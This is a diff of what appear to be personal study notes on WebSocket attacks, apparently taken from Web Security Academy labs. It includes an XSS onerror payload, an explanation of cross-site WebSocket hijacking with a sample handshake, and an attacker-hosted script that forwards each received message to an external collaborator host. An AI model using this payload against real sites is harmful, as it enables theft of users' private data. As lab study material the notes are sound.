@@ -13,13 +13,14 @@
 <img src='x' OnErEoR='alert`1`' />"
 ```
 
-##### Cross-site WebSocket hijacking
-[[CSRF]]
+##### Cross-site WebSocket hijacking (CSWSH)
+Essentially it is [[CSRF]] on a WebSocket handshake.
 
 * Perform unauthorized actions masquerading as the victim user.
 * Retrieve sensitive data that the user can access.
+* Just wait for incoming messages to arrive containing sensitive data.
 	
-Example of request without CSRF token, only session is required.
+Example of vulnerable request without CSRF token, only session is required.
 ```http
 GET /chat HTTP/1.1
 Host: normal-website.com
@@ -28,4 +29,18 @@ Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
 Connection: keep-alive, Upgrade
 Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
 Upgrade: websocket
+```
+
+The `Sec-WebSocket-Key` header contains a random value to prevent errors from caching proxies.
+Host on attackers machine:
+```html
+<script>
+    var ws = new WebSocket('wss://0a40006403bd192e806903bf000e009d.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://cvb0pjkci2e0ioc7j5pi4d1ygpmga7yw.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
 ```
